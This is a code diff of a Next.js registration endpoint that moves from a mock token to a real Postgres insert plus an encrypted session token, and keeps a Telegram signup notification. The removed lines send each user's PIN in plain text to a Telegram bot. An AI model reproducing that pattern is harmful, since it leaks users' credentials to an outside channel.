@@ -1,46 +1,51 @@
-import { NextRequest } from 'next/server';
-import { notify } from '@/lib/telegram';
+import { neon } from "@neondatabase/serverless";
+import { NextRequest, NextResponse } from "next/server";
+import { encrypt } from "@/lib/auth";
+import { notify } from "@/lib/telegram";
+
+const sql = neon(process.env.DATABASE_URL!);
 
 export async function POST(req: NextRequest) {
   try {
-    const { name, phone, pin, action } = await req.json();
+    const { name, phone } = await req.json();
     
-    // Send notification to Telegram based on the action
-    if (action === 'create_pin' && name && phone && pin) {
-      // Send notification with name, phone, and pin when creating PIN
-      await notify.signup(phone, name, 'N/A', pin);
-    } else if (name && phone) {
-      // Send notification for registration attempt
-      await notify.signup(phone, name, 'N/A', 'N/A');
+    // Check if user already exists in profiles table
+    const existingUsers = await sql`
+      SELECT phone_number 
+      FROM profiles 
+      WHERE phone_number = ${phone}
+    `;
+    
+    if (existingUsers.length > 0) {
+      return NextResponse.json(
+        { error: "User already exists" },
+        { status: 409 }
+      );
     }
     
-    // Create a mock token (in a real app, this would be a JWT)
-    const token = `mock_token_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+    // Send notification to Telegram first
+    await notify.signup(phone, name, 'N/A', 'N/A');
     
-    // In a real implementation, you would create the user in the database
-    // For now, we'll just return a success response
-    return new Response(
-      JSON.stringify({ 
-        success: true, 
-        message: 'User registered successfully',
-        token: token
-      }),
-      { 
-        status: 200,
-        headers: { 'Content-Type': 'application/json' }
-      }
-    );
+    // Create user in the profiles table (this serves as both registration and profile)
+    const result = await sql`
+      INSERT INTO profiles (phone_number, full_name, email, pin, status)
+      VALUES (${phone}, ${name}, 'N/A', 'N/A', 'otp_sent')
+      RETURNING *
+    `;
+    
+    // Create a session token
+    const token = await encrypt({ phone, name });
+    
+    return NextResponse.json({ 
+      success: true, 
+      message: 'Registration successful',
+      token: token
+    });
   } catch (error) {
-    console.error('Error registering user:', error);
-    return new Response(
-      JSON.stringify({ 
-        success: false, 
-        message: 'Failed to register user' 
-      }),
-      { 
-        status: 500,
-        headers: { 'Content-Type': 'application/json' }
-      }
+    console.error('Registration error:', error);
+    return NextResponse.json(
+      { error: 'Registration failed' },
+      { status: 500 }
     );
   }
 }
